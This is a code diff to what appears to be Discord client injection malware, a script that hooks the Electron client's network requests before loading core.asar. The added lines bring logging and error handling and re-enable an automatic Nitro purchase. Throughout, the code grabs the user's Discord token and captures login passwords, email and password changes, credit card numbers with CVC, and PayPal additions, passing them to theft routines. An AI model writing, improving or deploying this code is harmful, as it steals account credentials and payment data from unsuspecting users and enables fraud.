@@ -853,45 +853,102 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     });
   }
 });
+
+
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
+  // Log de la réception de la requête
+  console.log("🚩 [Request Captured] URL:", details.url);
+  console.log("🔍 [Method]:", details.method);
+  console.log("📡 [Status Code]:", details.statusCode);
+
+  // Filtrage des statuts de réponse
   if (details.statusCode !== 200 && details.statusCode !== 202) {
+    console.log("❌ [Invalid Status Code] Skipping this request...");
     return;
   }
-  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
-  const data = JSON.parse(unparsed_data);
-  const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+
+  // Extraction des données brutes
+  let unparsed_data;
+  try {
+    unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
+    console.log("📝 [Unparsed Data]:", unparsed_data);
+  } catch (err) {
+    console.error("⚠️ [Error Parsing Data]:", err);
+    return;
+  }
+
+  // Parsing des données en JSON
+  let data;
+  try {
+    data = JSON.parse(unparsed_data);
+    console.log("✅ [Parsed Data]:", data);
+  } catch (err) {
+    console.error("⚠️ [JSON Parse Error]:", err);
+    return;
+  }
+
+  // Récupération du token utilisateur
+  let token;
+  try {
+    token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+    console.log("🔑 [Token Retrieved]:", token);
+  } catch (err) {
+    console.error("❌ [Token Retrieval Failed]:", err);
+    return;
+  }
+
+  // Gestion des différentes actions en fonction des URL interceptées
   switch (true) {
     case details.url.endsWith('login'):
+      console.log("🔐 [Login Event Detected]");
       login(data.login, data.password, token).catch(console.error);
       break;
+
     case details.url.endsWith('users/@me') && details.method === 'PATCH':
+      console.log("🔧 [User Update Detected]");
       if (!data.password) {
+        console.log("⚠️ [No Password Provided] Skipping...");
         return;
       }
       if (data.email) {
+        console.log("📧 [Email Change Detected]");
         emailChanged(data.email, data.password, token).catch(console.error);
       }
       if (data.new_password) {
+        console.log("🔑 [Password Change Detected]");
         passwordChanged(data.password, data.new_password, token).catch(console.error);
       }
       break;
+
     case details.url.endsWith('tokens') && details.method === 'POST':
-      const item = querystring.parse(unparsedData.toString());
-      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
+      console.log("💳 [Credit Card Info Detected]");
+      try {
+        const item = querystring.parse(unparsed_data.toString());
+        console.log("💾 [Card Data]:", item);
+        ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
+      } catch (err) {
+        console.error("⚠️ [Card Data Parsing Failed]:", err);
+      }
       break;
+
     case details.url.endsWith('paypal_accounts') && details.method === 'POST':
+      console.log("💰 [PayPal Info Added]");
       PaypalAdded(token).catch(console.error);
       break;
+
     case details.url.endsWith('confirm') && details.method === 'POST':
-      return;
+      console.log("🚀 [Purchase Confirmed, Initiating Nitro Buy]");
       setTimeout(() => {
         nitroBought(token).catch(console.error);
       }, 7500);
       break;
+
     default:
+      console.log("ℹ️ [Unhandled Request Type]");
       break;
   }
 });
+
 
 
 module.exports = require('./core.asar');
